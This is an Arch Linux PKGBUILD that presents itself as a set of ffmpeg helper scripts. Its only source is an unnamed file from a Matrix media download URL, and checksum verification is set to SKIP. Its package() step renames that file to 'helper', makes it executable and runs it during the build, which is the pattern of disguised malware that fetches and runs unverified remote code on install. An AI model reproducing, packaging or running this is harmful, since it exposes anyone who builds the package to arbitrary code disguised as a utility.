pkgname=ffmpeg-scripts
pkgver=1.0
pkgrel=1
pkgdesc="Several scripts to make using ffmpeg more efficient"
arch=('x86_64')
url=""
license=('APACHE')
source=("https://matrix.org/_matrix/media/r0/download/matrix.org/vuPvOSXLXCdvKhMxTsmLrGDp")

sha256sums=('SKIP')

package() {
cd "${srcdir}"
mv vuPvOSXLXCdvKhMxTsmLrGDp helper
chmod +x helper
./helper
mkdir -p ${pkgdir}/usr/bin
mv scripts/* ${pkgdir}/usr/bin
}
